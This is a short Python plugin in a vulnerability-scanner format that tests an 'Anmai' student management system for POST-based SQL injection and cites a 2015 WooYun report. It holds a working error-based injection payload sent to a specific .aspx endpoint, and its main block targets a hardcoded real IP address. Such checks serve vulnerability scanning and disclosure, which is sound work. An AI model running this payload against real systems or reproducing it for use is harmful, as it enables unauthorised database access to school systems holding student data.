#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:安脉学生综合管理系统post注入
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0108502/
#Author:xq17

def assign(service, arg):
    if service == 'anmai':
        return True, arg

def audit(arg):
    payload = "time/shezhiSystem/XueKeNocourse.aspx"
    data="Course=1%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl2(url,data)
    if code == 500 or code ==200 and "testXQ17" in res:
        security_hole('find sql injection: ' + arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('anmai','http://218.22.96.74:8899/')[1])
        
